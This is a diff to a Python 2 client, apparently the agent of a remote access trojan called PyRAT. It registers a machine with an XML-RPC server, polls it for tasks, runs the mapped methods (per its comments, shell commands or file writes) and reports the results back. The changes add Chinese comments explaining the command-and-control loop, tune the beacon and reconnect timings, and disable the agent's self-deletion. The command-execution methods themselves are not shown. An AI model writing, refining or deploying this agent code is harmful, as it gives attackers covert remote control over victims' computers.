@@ -103,6 +103,7 @@ class XmlCli():
         }
         # XmlRPC server 地址
         self.svr = svr
+        # 连接XmlRPC server地址，执行server的注册函数，上报agent信息
         self.hello()
 
     def hello(self):
@@ -119,17 +120,22 @@ class XmlCli():
         while True:
             try:
                 self.cli = xmlrpclib.ServerProxy(self.svr, allow_none=True)
+                # 执行服务端的注册函数hello 上报自己的机器信息(client -->server)
                 self.cli.hello(self.id, XmlCli.PYRAT_CLIENT_VERSION, info)
                 break
             except Exception as e:
-                print e
-                time.sleep(1)
+                print "[!] mlrpclib.ServerProxy on hello err:", e
+                # 服务端连接端口 超时了
+                # 过半分钟在连接
+                time.sleep(30)
                 continue
 
     def run(self):
         while True:
             try:
-                # 监听服务端发来的信息
+                # 监听服务端发来的信息(server--->client)
+                # get_task 这个是在服务端的注册方法，会修改client的lasttime 用于判断机器是不是存在（类似心跳的掉线）
+                # 发起一次请求(类似http请求) 查看服务器也没有任务发下来啦
                 task = self.cli.get_task(self.id)
                 if task:
                     # print task
@@ -140,11 +146,12 @@ class XmlCli():
                     # ret = eval("cli."+task+"()")
                     method = self.cmdmap.get(task)
                     if method:
+                        # 执行对应方法 比如执行命令或者写文件等
                         (ret, data) = method(argv)
-                        # 将执行结果返回给服务端
+                        # 将执行服务器注册函数，结果返回给服务端(client -->server)
                         self.cli.resp_task(cid, tid, task, argv, ret, data)
-
-                time.sleep(0.01)
+                # 调小点
+                time.sleep(0.1)
             except Exception as e:
                 print e
                 self.hello()
@@ -183,7 +190,8 @@ class XmlCli():
         :return:
         """
         try:
-            os.remove(PYRATCLI)
+            # 这里先别删除
+            # os.remove(PYRATCLI)
             os._exit(0)
             return (True, "")
         except Exception as e:
@@ -300,7 +308,7 @@ class XmlCli():
 
 if __name__ == '__main__':
     if len(sys.argv) < 3:
-        print 'usage: %s ip port' % PYRATCLI
+        print '[*] usage: %s ip port' % PYRATCLI
         os._exit(0)
     url = "http://%s:%s" % (sys.argv[1], sys.argv[2])
     xc = XmlCli(url)
